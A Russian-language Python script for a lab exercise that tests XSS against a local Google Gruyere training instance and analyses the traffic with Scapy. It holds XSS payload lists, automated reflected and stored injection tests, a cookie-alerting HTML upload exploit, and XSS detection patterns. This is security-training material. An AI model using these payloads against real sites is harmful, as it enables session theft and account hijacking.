#!/usr/bin/env python3
"""
GOOGLE GRUYERE XSS ТЕСТИРОВАНИЕ С ИСПОЛЬЗОВАНИЕМ Scapy ДЛЯ АНАЛИЗА ТРАФИКА
Этапы: 1. Изучение Scapy, 2. Анализ трафика, 3. Эксплуатация XSS, 4. Анализ результатов, 5. Отчёт
"""

import sys
import time
import urllib.parse
import re
import random
import string
import http.client
import json
import os
import threading
from datetime import datetime
from scapy.all import *
import warnings
warnings.filterwarnings("ignore")

# ============================================================================
# КОНФИГУРАЦИЯ
# ============================================================================
GRUYERE_HOST = "127.0.0.1"
GRUYERE_PORT = 8008
GRUYERE_INSTANCE = "640953601453727775182124443115558544673"
GRUYERE_BASE_URL = f"http://{GRUYERE_HOST}:{GRUYERE_PORT}/{GRUYERE_INSTANCE}/"

# Интерфейс для захвата трафика (Windows loopback)
INTERFACE = r"\Device\NPF_Loopback"

# Генерация тестовых имен пользователей
def generate_username(base="test"):
    """Генерирует уникальное имя пользователя с временной меткой"""
    timestamp = datetime.now().strftime('%H%M%S')
    random_str = ''.join(random.choices(string.ascii_lowercase, k=4))
    return f"{base}_{timestamp}_{random_str}"

TEST_USERNAME = generate_username("user")
TEST_PASSWORD = "Test12345!"
ADMIN_USERNAME = generate_username("admin")
ADMIN_PASSWORD = "Admin12345!"

print(f"[!] Тестовый обычный пользователь: {TEST_USERNAME}")
print(f"[!] Тестовый администратор: {ADMIN_USERNAME}")

# XSS payloads для тестирования (из документации)
XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    
    # Reflected XSS через error.gtl
    "'\"><script>alert('XSS')</script>",
    
    # Stored XSS через сниппеты (из документации)
    "<a onmouseover=\"alert(1)\" href=\"#\">read this!</a>",
    "<p <script>alert(1)</script>hello",
    "</td <script>alert(1)</script>hello",
    "<a ONMOUSEOVER=\"alert(1)\" href=\"#\">read this!</a>",  # Обход регистра
    
    # XSS через цвет профиля
    "red' onload='alert(1)' onmouseover='alert(2)",
    
    # XSS через AJAX/JSON (из документации)
    'all <span style=display:none>" + (alert(1),"") + "</span>your base',
    
    # Для feed.gtl
    "<script>alert('feed XSS')</script>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

# ============================================================================
# ЭТАП 2: АНАЛИЗАТОР ТРАФИКА SCAPY
# ============================================================================

class ScapyTrafficAnalyzer:
    """Класс для захвата и анализа сетевого трафика через Scapy"""
    
    def __init__(self, interface, host, port):
        self.interface = self._detect_interface(interface)
        self.host = host
        self.port = port
        self.captured_packets = []
        self.http_requests = []
        self.http_responses = []
        self.xss_traffic = []
        self.is_capturing = False
        
    def _detect_interface(self, interface):
        """Обнаруживает подходящий интерфейс для захвата"""
        if interface:
            return interface
        
        # Пробуем найти loopback интерфейсы
        interfaces = get_if_list()
        
        loopback_candidates = [
            r"\Device\NPF_Loopback",  # Windows loopback
            "lo",                     # Linux loopback
            "lo0",                    # macOS loopback
            "Loopback",               # Общий вариант
        ]
        
        for candidate in loopback_candidates:
            for iface in interfaces:
                if candidate.lower() in iface.lower():
                    print(f"[+] Найден интерфейс: {iface}")
                    return iface
        
        # Если не нашли loopback, берем первый доступный
        if interfaces:
            print(f"[!] Loopback интерфейс не найден, использую: {interfaces[0]}")
            return interfaces[0]
        
        print("[!] Не найдены доступные интерфейсы")
        return None
    
    def start_capture(self, duration=30):
        """Запуск захвата трафика"""
        print(f"\n[*] Запускаю захват трафика на {duration} секунд...")
        print(f"[*] Интерфейс: {self.interface}")
        print(f"[*] Фильтр: host {self.host} and port {self.port}")
        
        self.is_capturing = True
        self.captured_packets = []
        self.http_requests = []
        self.http_responses = []
        self.xss_traffic = []
        
        try:
            # Функция обработки каждого пакета
            def packet_callback(pkt):
                if self.is_capturing and pkt.haslayer(TCP) and pkt.haslayer(Raw):
                    self.captured_packets.append(pkt)
                    
                    # Анализируем пакет в реальном времени
                    self._analyze_packet(pkt)
            
            # Захватываем трафик
            packets = sniff(
                iface=self.interface,
                filter=f"host {self.host} and port {self.port}",
                prn=packet_callback,
                timeout=duration,
                store=True
            )
            
            print(f"[+] Захват завершен. Пакетов: {len(self.captured_packets)}")
            
            # Сохраняем в файл
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"gruyere_traffic_{timestamp}.pcap"
            wrpcap(filename, self.captured_packets)
            print(f"[+] Трафик сохранен в: {filename}")
            
            return filename
            
        except Exception as e:
            print(f"[-] Ошибка захвата трафика: {e}")
            return None
        finally:
            self.is_capturing = False
    
    def _analyze_packet(self, packet):
        """Анализ отдельного пакета"""
        try:
            raw_data = bytes(packet[TCP].payload).decode('utf-8', errors='ignore')
            
            # Определяем тип пакета
            if raw_data.startswith('HTTP/1.1'):
                # Это HTTP ответ
                response_info = self._parse_http_response(raw_data, packet)
                if response_info:
                    self.http_responses.append(response_info)
                    
                    # Проверяем на наличие XSS в ответе
                    if self._check_for_xss_in_response(response_info):
                        self.xss_traffic.append({
                            'type': 'XSS в ответе',
                            'response': response_info,
                            'packet': packet,
                            'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3]
                        })
                        
            elif raw_data.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')):
                # Это HTTP запрос
                request_info = self._parse_http_request(raw_data, packet)
                if request_info:
                    self.http_requests.append(request_info)
                    
                    # Проверяем на наличие XSS в запросе
                    if self._check_for_xss_in_request(request_info):
                        self.xss_traffic.append({
                            'type': 'XSS в запросе',
                            'request': request_info,
                            'packet': packet,
                            'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3]
                        })
                        
        except:
            pass
    
    def _parse_http_request(self, raw_data, packet):
        """Парсинг HTTP запроса"""
        lines = raw_data.split('\r\n')
        if not lines:
            return None
            
        request_line = lines[0]
        parts = request_line.split(' ')
        if len(parts) < 3:
            return None
            
        method, path, protocol = parts[0], parts[1], parts[2]
        
        # Заголовки
        headers = {}
        body_start = 0
        
        for i, line in enumerate(lines[1:], 1):
            if line == '':
                body_start = i + 1
                break
            if ': ' in line:
                key, value = line.split(': ', 1)
                headers[key] = value
        
        # Тело (если есть)
        body = '\r\n'.join(lines[body_start:]) if body_start < len(lines) else ''
        
        return {
            'method': method,
            'path': path,
            'protocol': protocol,
            'headers': headers,
            'body': body,
            'source_ip': packet[IP].src if packet.haslayer(IP) else 'N/A',
            'destination_ip': packet[IP].dst if packet.haslayer(IP) else 'N/A',
            'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3],
            'raw': raw_data[:500]
        }
    
    def _parse_http_response(self, raw_data, packet):
        """Парсинг HTTP ответа"""
        lines = raw_data.split('\r\n')
        if not lines:
            return None
            
        status_line = lines[0]
        parts = status_line.split(' ')
        if len(parts) < 3:
            return None
            
        protocol, status_code, status_text = parts[0], parts[1], ' '.join(parts[2:])
        
        # Заголовки
        headers = {}
        body_start = 0
        
        for i, line in enumerate(lines[1:], 1):
            if line == '':
                body_start = i + 1
                break
            if ': ' in line:
                key, value = line.split(': ', 1)
                headers[key] = value
        
        # Тело
        body = '\r\n'.join(lines[body_start:]) if body_start < len(lines) else ''
        
        return {
            'protocol': protocol,
            'status_code': status_code,
            'status_text': status_text,
            'headers': headers,
            'body': body,
            'source_ip': packet[IP].src if packet.haslayer(IP) else 'N/A',
            'destination_ip': packet[IP].dst if packet.haslayer(IP) else 'N/A',
            'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3],
            'raw': raw_data[:1000]
        }
    
    def _check_for_xss_in_request(self, request_info):
        """Проверка запроса на наличие XSS payloads"""
        search_text = request_info['path'] + ' ' + request_info['body']
        
        for payload in XSS_PAYLOADS:
            # Проверяем оригинальный payload
            if payload in search_text:
                return True
            
            # Проверяем URL-encoded версию
            encoded_payload = urllib.parse.quote(payload, safe='')
            if encoded_payload in search_text:
                return True
        
        # Проверяем паттерны
        xss_patterns = [
            r'<script[^>]*>',
            r'onerror=',
            r'onload=',
            r'javascript:',
            r"alert\(",
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, search_text, re.IGNORECASE):
                return True
        
        return False
    
    def _check_for_xss_in_response(self, response_info):
        """Проверка ответа на наличие XSS payloads"""
        # Проверяем конкретные payloads
        for payload in XSS_PAYLOADS:
            if payload in response_info['body']:
                # Проверяем, экранирован ли
                if payload.startswith('<script>') and '&lt;script&gt;' not in response_info['body']:
                    return True
                elif payload.startswith('<img') and '&lt;img' not in response_info['body']:
                    return True
                elif payload.startswith('<svg') and '&lt;svg' not in response_info['body']:
                    return True
        
        # Проверяем паттерны без экранирования
        dangerous_patterns = [
            ('<script>', '&lt;script&gt;'),
            ('</script>', '&lt;/script&gt;'),
            ('onerror=', 'onerror='),  # Проверяем без экранирования
            ('onload=', 'onload='),
        ]
        
        for dangerous, safe in dangerous_patterns:
            if dangerous in response_info['body'] and safe not in response_info['body']:
                return True
        
        return False
    
    def generate_traffic_report(self):
        """Генерация отчета о трафике"""
        report = f"""
{'='*80}
ОТЧЕТ О СЕТЕВОМ ТРАФИКЕ (SCAPY)
{'='*80}

Общая статистика:
  Всего пакетов: {len(self.captured_packets)}
  HTTP запросов: {len(self.http_requests)}
  HTTP ответов: {len(self.http_responses)}
  Обнаружено XSS в трафике: {len(self.xss_traffic)}

Детектированные XSS в трафике:
"""
        
        if self.xss_traffic:
            for i, xss in enumerate(self.xss_traffic, 1):
                report += f"\n{i}. Тип: {xss['type']}\n"
                report += f"   Время: {xss['timestamp']}\n"
                
                if 'request' in xss:
                    req = xss['request']
                    report += f"   Запрос: {req['method']} {req['path']}\n"
                    report += f"   Источник: {req['source_ip']}\n"
                
                if 'response' in xss:
                    resp = xss['response']
                    report += f"   Ответ: {resp['status_code']} {resp['status_text']}\n"
                    report += f"   Назначение: {resp['destination_ip']}\n"
                
                # Показываем обнаруженные паттерны
                raw_data = ''
                if 'request' in xss:
                    raw_data = xss['request'].get('raw', '')
                elif 'response' in xss:
                    raw_data = xss['response'].get('raw', '')
                
                if raw_data:
                    # Ищем конкретные payloads
                    found_payloads = []
                    for payload in XSS_PAYLOADS:
                        if payload in raw_data:
                            found_payloads.append(payload[:50])
                    
                    if found_payloads:
                        report += f"   Обнаруженные payloads: {', '.join(found_payloads[:3])}\n"
        else:
            report += "\n  Не обнаружено XSS в захваченном трафике.\n"
        
        # HTTP статистика
        report += f"\nHTTP Статистика:\n"
        
        if self.http_requests:
            report += f"  Запросы по методам:\n"
            methods = {}
            for req in self.http_requests:
                method = req['method']
                methods[method] = methods.get(method, 0) + 1
            
            for method, count in methods.items():
                report += f"    {method}: {count}\n"
        
        if self.http_responses:
            report += f"  Ответы по статусам:\n"
            statuses = {}
            for resp in self.http_responses:
                status = resp['status_code']
                statuses[status] = statuses.get(status, 0) + 1
            
            for status, count in statuses.items():
                report += f"    {status}: {count}\n"
        
        return report

# ============================================================================
# ЭТАП 3: ТЕСТИРОВАНИЕ XSS УЯЗВИМОСТЕЙ (используем http.client как в вашем скрипте)
# ============================================================================

class XSSTester:
    """Класс для тестирования XSS уязвимостей (адаптирован из вашего скрипта)"""
    
    def __init__(self, host, port, instance_id):
        self.host = host
        self.port = port
        self.instance_id = instance_id
        self.cookies = {}
        self.session_cookies = []
        self.vulnerabilities = []
        self.xss_detections = []
        self.current_user = None
        self.current_role = None
        
    def send_request(self, path, method="GET", data=None, headers=None, cookies_override=None):
        """Отправляет HTTP запрос с поддержкой cookies (аналогично вашему скрипту)"""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=10)
        
        # Формируем полный путь
        full_path = f"/{self.instance_id}{path}" if not path.startswith(f"/{self.instance_id}") else path
        
        # Базовые заголовки
        request_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'close',
        }
        
        # Используем переданные cookies или стандартные
        cookies_to_use = cookies_override if cookies_override else self.cookies
        if cookies_to_use:
            cookie_str = '; '.join([f"{k}={v}" for k, v in cookies_to_use.items()])
            request_headers['Cookie'] = cookie_str
        
        if headers:
            request_headers.update(headers)
        
        try:
            if method.upper() == "GET":
                if data:
                    if isinstance(data, dict):
                        params = urllib.parse.urlencode(data)
                        full_path = f"{full_path}?{params}"
                conn.request("GET", full_path, headers=request_headers)
                
            elif method.upper() == "POST":
                if data:
                    if isinstance(data, dict):
                        body = urllib.parse.urlencode(data)
                    else:
                        body = str(data)
                    request_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    request_headers['Content-Length'] = str(len(body))
                    conn.request("POST", full_path, body=body, headers=request_headers)
                else:
                    conn.request("POST", full_path, headers=request_headers)
            
            response = conn.getresponse()
            response_data = response.read().decode('utf-8', errors='ignore')
            
            # Сохраняем cookies из ответа
            if 'Set-Cookie' in response.headers:
                cookies_header = response.headers.get_all('Set-Cookie')
                for cookie in cookies_header:
                    cookie_parts = cookie.split(';')[0].split('=')
                    if len(cookie_parts) >= 2:
                        self.cookies[cookie_parts[0]] = cookie_parts[1]
                        self.session_cookies.append(cookie_parts[1])
            
            return {
                'status': response.status,
                'headers': dict(response.headers),
                'body': response_data,
                'url': f"http://{self.host}:{self.port}{full_path}"
            }
            
        except Exception as e:
            print(f"[-] Ошибка запроса: {e}")
            return None
        finally:
            conn.close()
    
    def test_reflected_xss_error(self):
        """Тестирование Reflected XSS через error.gtl (из документации)"""
        print(f"\n{'='*80}")
        print("ТЕСТ 1: REFLECTED XSS ЧЕРЕЗ ERROR.GTL")
        print(f"{'='*80}")
        
        # Payloads из документации
        payloads = [
            "<script>alert('XSS1')</script>",
            "<img src=x onerror=alert('XSS2')>",
            "<svg onload=alert('XSS3')>",
            
            # Различные кодировки из документации
            "%3Cscript%3Ealert('XSS4')%3C/script%3E",
            "%253Cscript%253Ealert('XSS5')%253C/script%253E",  # Двойное кодирование
            "\"><script>alert('XSS6')</script>",
            
            # Для проверки экранирования
            "test<script>alert(1)</script>",
            "test' onmouseover='alert(1)",
        ]
        
        vulnerable_count = 0
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n[*] Тест {i}: {payload[:40]}...")
            
            # Формируем путь (несуществующий путь для error.gtl)
            if payload.startswith('%'):
                path = f"/{payload}"
            else:
                encoded_payload = urllib.parse.quote(payload, safe='')
                path = f"/{encoded_payload}"
            
            response = self.send_request(path)
            
            if response:
                # Сохраняем ответ для анализа
                filename = f"reflected_xss_{i}.html"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(response['body'])
                
                # Анализируем ответ
                is_vulnerable = False
                evidence = ""
                
                # Проверяем, отражен ли payload
                if payload in response['body']:
                    is_vulnerable = True
                    evidence = f"Payload отражен без изменений"
                elif payload.replace("'", "&#39;") in response['body']:
                    evidence = f"Payload отражен с HTML entities"
                elif urllib.parse.unquote(payload) in response['body']:
                    is_vulnerable = True
                    evidence = f"URL-decoded payload отражен"
                
                # Проверяем экранирование
                if is_vulnerable:
                    # Проверяем, экранированы ли опасные символы
                    if '<script>' in payload and '&lt;script&gt;' not in response['body']:
                        vulnerable_count += 1
                        print(f"[!] УЯЗВИМОСТЬ ОБНАРУЖЕНА: {evidence}")
                        
                        vulnerability = {
                            'type': 'Reflected XSS (error.gtl)',
                            'severity': 'ВЫСОКИЙ',
                            'description': 'XSS payload отражен в ответе без экранирования',
                            'location': f'error.gtl (несуществующий путь)',
                            'payload': payload,
                            'exploitation': f'Перейти по ссылке: {GRUYERE_BASE_URL}{path.lstrip("/")}',
                            'fix': 'Использовать {{_message:text}} в error.gtl для экранирования',
                            'evidence': evidence
                        }
                        self.vulnerabilities.append(vulnerability)
                    else:
                        print(f"[-] Payload экранирован (безопасно)")
                else:
                    print(f"[-] Payload не отражен в ответе")
            else:
                print(f"[-] Нет ответа от сервера")
            
            time.sleep(1)
        
        print(f"\n[*] Результат: {vulnerable_count}/{len(payloads)} Reflected XSS уязвимостей")
        return vulnerable_count > 0
    
    def test_stored_xss_snippets(self):
        """Тестирование Stored XSS через сниппеты (требует аутентификации)"""
        print(f"\n{'='*80}")
        print("ТЕСТ 2: STORED XSS В СНИППЕТАХ")
        print(f"{'='*80}")
        
        print("[*] Этот тест требует аутентификации")
        print("[*] Сначала создадим тестового пользователя...")
        
        # Создаем пользователя
        self._create_test_user()
        
        if not self.current_user:
            print("[-] Не удалось создать/войти как тестовый пользователь")
            print("[*] Payloads для ручного тестирования:")
            
            stored_payloads = [
                "<a onmouseover=\"alert(1)\" href=\"#\">read this!</a>",
                "<p <script>alert(1)</script>hello",
                "</td <script>alert(1)</script>hello",
                "<a ONMOUSEOVER=\"alert(1)\" href=\"#\">read this!</a>",
            ]
            
            for i, payload in enumerate(stored_payloads, 1):
                print(f"{i}. {payload}")
            
            return False
        
        print(f"[+] Вошли как: {self.current_user}")
        
        # Payloads для Stored XSS из документации
        stored_payloads = [
            "<script>alert('Stored XSS 1')</script>",
            "<img src='x.jpg' onerror='alert(\"Stored XSS 2\")'>",
            "<a onmouseover=\"alert(1)\" href=\"#\">Наведи на меня</a>",
        ]
        
        vulnerable_count = 0
        
        for i, payload in enumerate(stored_payloads, 1):
            print(f"\n[*] Тест {i}: {payload[:40]}...")
            
            # Создаем сниппет
            response = self.send_request("/newsnippet2", "GET", {'snippet': payload})
            
            if response and response['status'] == 200:
                print(f"[+] Сниппет создан")
                
                # Проверяем на главной странице
                home_response = self.send_request("/")
                
                if home_response and payload in home_response['body']:
                    print(f"[!] Payload отражен на главной странице!")
                    
                    # Проверяем экранирование
                    if '<script>' in payload and '&lt;script&gt;' not in home_response['body']:
                        vulnerable_count += 1
                        print(f"[!] УЯЗВИМОСТЬ ОБНАРУЖЕНА: Stored XSS!")
                        
                        vulnerability = {
                            'type': 'Stored XSS (сниппеты)',
                            'severity': 'ВЫСОКИЙ',
                            'description': 'JavaScript код в сниппетах не экранируется',
                            'location': '/newsnippet2 → главная страница',
                            'payload': payload,
                            'exploitation': 'Создание сниппета с JavaScript кодом',
                            'fix': 'Экранировать HTML сущности в выводе сниппетов',
                            'evidence': 'Payload присутствует на главной странице без экранирования'
                        }
                        self.vulnerabilities.append(vulnerability)
                    else:
                        print(f"[-] Payload экранирован")
                else:
                    print(f"[-] Payload не найден на главной странице")
            else:
                print(f"[-] Не удалось создать сниппет")
            
            time.sleep(1)
            self._cleanup_snippets()
        
        print(f"\n[*] Результат: {vulnerable_count}/{len(stored_payloads)} Stored XSS уязвимостей")
        return vulnerable_count > 0
    
    def test_xss_via_ajax(self):
        """Тестирование XSS через AJAX feed.gtl"""
        print(f"\n{'='*80}")
        print("ТЕСТ 3: XSS ЧЕРЕЗ AJAX FEED.GTL")
        print(f"{'='*80}")
        
        # Проверяем feed.gtl с XSS в параметре uid
        payloads = [
            "<script>alert('XSS')</script>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ]
        
        vulnerable_count = 0
        
        for payload in payloads:
            print(f"\n[*] Тестирую: feed.gtl?uid={payload[:30]}...")
            
            response = self.send_request("/feed.gtl", "GET", {'uid': payload})
            
            if response:
                # Сохраняем ответ
                safe_payload = payload.replace('<', '_').replace('>', '_').replace('/', '_')
                filename = f"ajax_xss_{safe_payload[:20]}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(response['body'][:500])
                
                # Анализируем ответ
                if '_feed' in response['body'] and payload.replace('%3C', '<').replace('%3E', '>') in response['body']:
                    print(f"[!] Возможна XSS через AJAX!")
                    
                    # Проверяем Content-Type
                    content_type = response['headers'].get('Content-Type', '')
                    print(f"  Content-Type: {content_type}")
                    
                    vulnerable_count += 1
                    
                    vulnerability = {
                        'type': 'XSS via AJAX',
                        'severity': 'СРЕДНИЙ',
                        'description': 'JSON/JavaScript ответ содержит XSS payload',
                        'location': 'feed.gtl?uid=',
                        'payload': payload,
                        'exploitation': 'Включение feed.gtl?uid=<script> в script tag',
                        'fix': 'Использовать JavaScript escapes (\\x3c, \\x3e) и правильный Content-Type',
                        'evidence': f'Ответ содержит payload: {payload[:50]}...'
                    }
                    self.vulnerabilities.append(vulnerability)
                else:
                    print(f"[-] XSS через AJAX не обнаружена")
            else:
                print(f"[-] Нет ответа")
        
        # Тестируем JSON break payload из документации
        print(f"\n[*] JSON break payload из документации:")
        json_break_payload = 'all <span style=display:none>" + (alert(1),"") + "</span>your base'
        print(f"    {json_break_payload}")
        print(f"[*] Для тестирования создайте сниппет с этим payload и обновите страницу")
        
        print(f"\n[*] Результат: {vulnerable_count}/{len(payloads)} AJAX XSS уязвимостей")
        return vulnerable_count > 0
    
    def test_xss_via_color(self):
        """Тестирование XSS через цвет профиля"""
        print(f"\n{'='*80}")
        print("ТЕСТ 4: XSS ЧЕРЕЗ ЦВЕТ ПРОФИЛЯ")
        print(f"{'='*80}")
        
        print("[*] Из документации: цвет отображается как style='color:color'")
        print("[*] Payload для тестирования:")
        
        color_payloads = [
            "red' onload='alert(1)' onmouseover='alert(2)",
            "red\" onload=\"alert(1)\" onmouseover=\"alert(2)",
        ]
        
        for i, payload in enumerate(color_payloads, 1):
            print(f"{i}. {payload}")
        
        print(f"\n[*] Для тестирования необходимо:")
        print("    1. Зарегистрироваться и войти в систему")
        print("    2. Перейти в профиль (editprofile.gtl)")
        print("    3. В поле 'Profile Color' ввести payload")
        print("    4. Сохранить и проверить главную страницу")
        
        # Проверяем, авторизованы ли мы
        if self.current_user:
            print(f"\n[*] Пробуем изменить цвет профиля...")
            
            for payload in color_payloads:
                response = self.send_request("/saveprofile", "GET", {
                    'action': 'update',
                    'color': payload,
                    'name': 'XSS Tester'
                })
                
                if response and 'Profile updated' in response['body']:
                    print(f"[+] Цвет профиля изменен на: {payload[:30]}...")
                    
                    # Проверяем главную страницу
                    home_response = self.send_request("/")
                    if home_response and payload in home_response['body']:
                        print(f"[!] Payload присутствует на главной странице!")
                        
                        vulnerability = {
                            'type': 'XSS via Color',
                            'severity': 'СРЕДНИЙ',
                            'description': 'XSS через поле цвета профиля',
                            'location': 'editprofile.gtl → главная страница',
                            'payload': payload,
                            'exploitation': 'Установка цвета профиля с XSS payload',
                            'fix': 'Использовать правильное экранирование для атрибутов HTML',
                            'evidence': f'Payload {payload[:30]}... присутствует на главной странице'
                        }
                        self.vulnerabilities.append(vulnerability)
        
        return len([v for v in self.vulnerabilities if 'Color' in v['type']]) > 0
    
    def test_file_upload_xss(self):
        """Тестирование XSS через загрузку файлов"""
        print(f"\n{'='*80}")
        print("ТЕСТ 5: XSS ЧЕРЕЗ ЗАГРУЗКУ ФАЙЛОВ")
        print(f"{'='*80}")
        
        print("[*] Из документации: можно загружать HTML файлы с JavaScript")
        print("[*] Эксплойт (сохраните в файл evil.html):")
        
        exploit_html = """<!DOCTYPE html>
<html>
<head><title>XSS File</title></head>
<body>
<script>
    alert('XSS через загруженный файл');
    alert('Cookies: ' + document.cookie);
</script>
<h1>Вредоносная страница</h1>
</body>
</html>"""
        
        print(exploit_html)
        
        print(f"\n[*] Для тестирования необходимо:")
        print("    1. Зарегистрироваться и войти в систему")
        print(f"    2. Перейти на {GRUYERE_BASE_URL}upload.gtl")
        print("    3. Загрузить HTML файл с вышеуказанным содержимым")
        print("    4. Перейти по полученной ссылке")
        
        # Проверяем доступность upload endpoint
        response = self.send_request("/upload.gtl")
        
        if response and '200' in str(response['status']):
            print(f"\n[+] Страница загрузки файлов доступна")
            if '<form' in response['body'].lower() and 'multipart/form-data' in response['body'].lower():
                print(f"[!] Найдена форма загрузки - возможна File Upload XSS")
                
                vulnerability = {
                    'type': 'File Upload XSS',
                    'severity': 'ВЫСОКИЙ',
                    'description': 'Возможность загрузки HTML файлов с JavaScript',
                    'location': 'upload.gtl',
                    'payload': 'HTML файл с <script>alert()</script>',
                    'exploitation': 'Загрузка HTML файла с JavaScript кодом',
                    'fix': 'Проверять тип загружаемых файлов, хостить пользовательский контент на отдельном домене',
                    'evidence': 'Форма загрузки поддерживает HTML файлы'
                }
                self.vulnerabilities.append(vulnerability)
            else:
                print(f"[-] Форма загрузки не найдена")
        else:
            print(f"\n[-] Страница загрузки недоступна")
        
        return len([v for v in self.vulnerabilities if 'File Upload' in v['type']]) > 0
    
    def _create_test_user(self):
        """Создает тестового пользователя"""
        print(f"[*] Создание тестового пользователя...")
        
        user_data = {
            'action': 'new',
            'uid': TEST_USERNAME,
            'pw': TEST_PASSWORD,
            'is_author': 'True'
        }
        
        response = self.send_request("/saveprofile", "GET", user_data)
        
        if response and ('Account created' in response['body'] or 'User already exists' in response['body']):
            print(f"[+] Пользователь {TEST_USERNAME} создан")
            
            # Логинимся
            login_response = self.send_request("/login", "GET", 
                                              {'uid': TEST_USERNAME, 'pw': TEST_PASSWORD})
            
            if login_response and 'Invalid user name or password' not in login_response['body']:
                print(f"[+] Успешный вход: {TEST_USERNAME}")
                self.current_user = TEST_USERNAME
                return True
        
        print(f"[-] Не удалось создать/войти как тестовый пользователь")
        return False
    
    def _cleanup_snippets(self):
        """Удаляет тестовые сниппеты"""
        try:
            response = self.send_request("/snippets.gtl")
            if not response:
                return
            
            delete_links = re.findall(r'href=[\'"]?([^\'" >]+deletesnippet\?index=\d+)', response['body'])
            
            for link in delete_links:
                self.send_request(link)
                time.sleep(0.1)
                
        except Exception as e:
            print(f"  [*] Ошибка очистки сниппетов: {e}")
    
    def run_all_xss_tests(self):
        """Запускает все XSS тесты"""
        print(f"\n{'='*80}")
        print("ЗАПУСК ВСЕХ XSS ТЕСТОВ")
        print(f"{'='*80}")
        
        # Очищаем результаты
        self.vulnerabilities = []
        self.xss_detections = []
        
        # Запускаем тесты
        self.test_reflected_xss_error()
        time.sleep(2)
        
        self.test_stored_xss_snippets()
        time.sleep(2)
        
        self.test_xss_via_ajax()
        time.sleep(2)
        
        self.test_xss_via_color()
        time.sleep(2)
        
        self.test_file_upload_xss()
        
        print(f"\n{'='*80}")
        print("XSS ТЕСТИРОВАНИЕ ЗАВЕРШЕНО")
        print(f"{'='*80}")
        
        return len(self.vulnerabilities) > 0

# ============================================================================
# ЭТАП 4+5: АНАЛИЗ РЕЗУЛЬТАТОВ И ГЕНЕРАЦИЯ ОТЧЕТА
# ============================================================================

def generate_final_report(xss_tester, traffic_analyzer, traffic_filename):
    """Генерация финального отчета"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_filename = f"gruyere_xss_full_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    report = f"""
{'='*100}
ОТЧЕТ О ТЕСТИРОВАНИИ XSS УЯЗВИМОСТЕЙ GOOGLE GRUYERE
{'='*100}

Дата тестирования: {timestamp}
Целевой сервер: {GRUYERE_HOST}:{GRUYERE_PORT}
Инстанс: {GRUYERE_INSTANCE}
Базовый URL: {GRUYERE_BASE_URL}
Тестовый пользователь: {TEST_USERNAME}

ИСПОЛНЕННЫЕ ЭТАПЫ:
1. Изучение и настройка Scapy для анализа трафика
2. Захват и анализ сетевого трафика во время тестирования
3. Эксплуатация XSS уязвимостей (все типы из документации)
4. Анализ результатов в сетевом трафике
5. Подготовка комплексного отчета

{'='*100}
РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ XSS
{'='*100}

Всего обнаружено уязвимостей: {len(xss_tester.vulnerabilities)}

Детали уязвимостей:
"""
    
    if xss_tester.vulnerabilities:
        # Группируем по типу
        vuln_types = {}
        for vuln in xss_tester.vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(vuln)
        
        for vuln_type, vulns in vuln_types.items():
            report += f"\n{vuln_type.upper()}: {len(vulns)} уязвимостей\n"
            for vuln in vulns:
                report += f"  • {vuln['description']} (Уровень: {vuln['severity']})\n"
                report += f"    Payload: {vuln['payload'][:100]}...\n"
                report += f"    Исправление: {vuln['fix']}\n"
    else:
        report += "\n  Критических XSS уязвимостей не обнаружено.\n"
    
    # Анализ трафика
    report += f"""
{'='*100}
АНАЛИЗ СЕТЕВОГО ТРАФИКА (SCAPY)
{'='*100}

Файл трафика: {traffic_filename}
"""
    
    if traffic_analyzer:
        traffic_report = traffic_analyzer.generate_traffic_report()
        report += traffic_report
    
    # Изменения в трафике во время XSS атак
    report += f"""
{'='*100}
ИЗМЕНЕНИЯ В ТРАФИКЕ ВО ВРЕМЯ XSS АТАК
{'='*100}

Анализ захваченного трафика показывает следующие изменения:
"""
    
    if traffic_analyzer and traffic_analyzer.xss_traffic:
        report += f"""
1. Появление XSS payloads в HTTP запросах:
   • Обнаружено {len([x for x in traffic_analyzer.xss_traffic if 'запросе' in x['type']])} запросов с XSS
   • Payloads включают: <script>, onerror, onload, alert()
   
2. Отражение XSS в HTTP ответах:
   • Обнаружено {len([x for x in traffic_analyzer.xss_traffic if 'ответе' in x['type']])} ответов с XSS
   • Сервер возвращает payloads без должного экранирования
   
3. Паттерны трафика:
   • Увеличение размера ответов при XSS payloads
   • Наличие опасных символов (<, >, ", ') без экранирования
   • Content-Type: text/html для JSON ответов (feed.gtl)
"""
    else:
        report += "\n  В захваченном трафике не обнаружено явных признаков XSS атак.\n"
    
    # Выводы и рекомендации
    report += f"""
{'='*100}
ВЫВОДЫ И РЕКОМЕНДАЦИИ
{'='*100}

1. ОБЩИЕ ВЫВОДЫ:
   • Приложение содержит {len(xss_tester.vulnerabilities)} XSS уязвимостей
   • Наиболее опасные: Stored XSS и Reflected XSS
   • Захват трафика подтвердил передачу XSS payloads

2. КОНКРЕТНЫЕ ПРОБЛЕМЫ:
   • Отсутствие экранирования в error.gtl (Reflected XSS)
   • Неполная санитизация сниппетов (Stored XSS)
   • Возможность загрузки HTML файлов (File Upload XSS)
   • Небезопасная обработка JSON (XSS через AJAX)

